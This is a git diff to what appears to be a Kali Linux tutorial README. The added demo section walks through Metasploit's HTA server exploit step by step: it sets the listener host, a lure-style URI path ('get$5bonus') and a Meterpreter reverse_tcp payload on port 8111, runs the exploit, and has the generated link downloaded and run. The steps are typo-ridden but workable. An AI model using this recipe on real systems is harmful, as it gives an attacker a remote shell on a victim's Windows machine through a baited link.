@@ -100,11 +100,40 @@ Once you receive the message Installation is complete, click Continue to reboot 
 
 # DEMO :
 ## 1. open kali linux terminal
---->>> update your kali linux using the command :
-'''' apt-get update
-'''' apt-get upgrade
+--->>> update your kali linux using the command:
+'''' #apt-get update
+'''' #apt-get upgrade
 
---->>>
+--->>> log the system to attack tape:
+msfconsole
+
+--->>> when you are in the console tape
+'''' 3use exploit/windows/misc/hta_server
+
+--->>> open a new terminal to find your IP address and tape
+'''' $ifconfig
+
+--->>> set the listing host and server host using the following command
+'''' #set lhost "your Ip address"
+'''' #set srvhost "your Ip address"
+
+--->>> set payload or you can name it using following comand 
+
+'''' #set uripath /name here like (get$5bonus)
+
+--->>>or set payload following comand
+'''' # set payload windows/meterpreter/reverse_tcp
+'''' # set lport 8111 
+
+--->>>tape exploit
+'''' #exploit
+
+--->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 
+
+
+
+
+
 
 # FINAL REVIEW :
 
